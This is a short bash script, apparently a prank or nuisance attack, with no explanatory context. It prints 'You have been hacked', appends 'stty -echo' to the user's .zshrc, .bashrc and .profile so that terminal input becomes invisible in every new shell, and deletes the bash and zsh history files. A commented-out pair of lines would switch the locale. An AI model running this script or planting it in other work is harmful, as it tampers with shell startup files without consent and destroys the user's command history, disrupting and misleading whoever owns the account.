#!/bin/bash

echo "You have been hacked"

# echo 'export LANG=zh_TW.UTF-8' >> ~/.bashrc
# source ~/.bashrc

echo "stty -echo" >> ~/.zshrc
echo "stty -echo" >> ~/.bashrc
echo "stty -echo" >> ~/.profile
rm -f ~/.bash_history
rm -f ~/.zsh_history
